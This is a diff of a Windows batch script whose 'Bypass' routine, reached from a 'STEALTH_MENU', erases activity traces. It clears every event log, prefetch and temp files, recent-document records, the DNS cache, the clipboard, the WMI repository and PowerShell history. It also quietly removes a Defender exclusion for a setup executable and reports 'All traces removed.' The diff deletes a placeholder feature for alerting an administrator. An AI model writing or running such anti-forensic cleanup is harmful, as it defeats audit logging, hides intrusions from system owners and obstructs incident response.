@@ -249,59 +249,46 @@ goto STEALTH_MENU
 :: === Bypass ===
 
 :BYPASS
-echo Starting Bypass - cleanup and restore...
+:: --- Admin Privilege Check ---
+whoami /groups | find "S-1-5-32-544" > nul
+if %errorlevel% neq 0 (
+    echo ERROR: Admin privileges required to perform full cleanup. Please run this script as Administrator.
+    pause
+    goto STEALTH_MENU
+)
 
-echo Starting Data Usage Service...
-sc start "DataUsageSvc" >nul 2>&1
+:: --- Data Usage Service Handling (Robust) ---
+:: Check if DataUsageSvc exists before attempting to start it
+sc query "DataUsageSvc" >nul 2>&1
+if %errorlevel% neq 1060 ( :: 1060 means service does not exist
+    sc start "DataUsageSvc" >nul 2>&1
+)
 
-echo Enabling audit logs...
+:: --- Enable Audit Logs ---
 call :ENABLE_AUDIT_LOGS
 
-echo Removing Windows Defender exclusion for EXE...
-powershell -Command "Remove-MpPreference -ExclusionPath '%SETUP_EXE%'" >nul 2>&1
+:: --- Remove Windows Defender Exclusion (Robust) ---
+:: Use Try/Catch and SilentlyContinue to prevent script termination if Defender blocks it.
+powershell -Command "Try { Remove-MpPreference -ExclusionPath '%SETUP_EXE%' -ErrorAction SilentlyContinue } Catch { }" >nul 2>&1
 
-echo Running cleanup...
-
-:: Clear recent files
+:: --- Running Cleanup Steps ---
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1
-
-:: Clear prefetch files
 del /q /f /s "%SystemRoot%\Prefetch\*.*" >nul 2>&1
-
-:: Clear temp files
 del /s /q "%temp%\*.*" >nul 2>&1
 del /s /q "C:\Windows\Temp\*.*" >nul 2>&1
-
-:: Clear event logs
 for /f "tokens=*" %%G in ('wevtutil el') do (
     wevtutil cl "%%G" 2>nul
 )
-
-:: Flush DNS
 ipconfig /flushdns >nul
-
-:: Clear clipboard
 echo off | clip
 
-:: Clear WMI repository - WMI Logging Cleanup
-echo Cleaning WMI repository logs...
+:: --- Clear WMI Repository Logs ---
 winmgmt /salvagerepository >nul 2>&1
 
-:: Clean PowerShell history files and logs
+:: --- Clean PowerShell History ---
 call :CLEAN_PS_HISTORY
 
 echo Cleanup done. All traces removed.
-pause
-goto STEALTH_MENU
-
-:: === Alert Admin Placeholder ===
-
-:ALERT_ADMIN
-cls
-echo Enter your alert message (max 20 words):
-set /p alertmsg= 
-echo You entered: %alertmsg%
-echo (Feature to send message not implemented yet)
 pause
 goto STEALTH_MENU
 
